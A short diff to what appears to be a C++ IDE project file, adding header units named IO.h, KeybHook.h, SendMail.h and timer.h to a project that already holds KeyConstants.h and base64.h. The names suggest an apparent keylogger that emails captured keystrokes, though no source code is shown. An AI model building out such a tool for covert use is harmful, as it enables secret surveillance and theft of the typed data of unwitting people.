@@ -32,10 +32,14 @@
 			<Add option="-Wall" />
 			<Add option="-fexceptions" />
 		</Compiler>
+		<Unit filename="IO.h" />
 		<Unit filename="KeyConstants.h" />
+		<Unit filename="KeybHook.h" />
+		<Unit filename="SendMail.h" />
 		<Unit filename="base64.h" />
 		<Unit filename="helper.h" />
 		<Unit filename="main.cpp" />
+		<Unit filename="timer.h" />
 		<Extensions>
 			<code_completion />
 			<envvars />
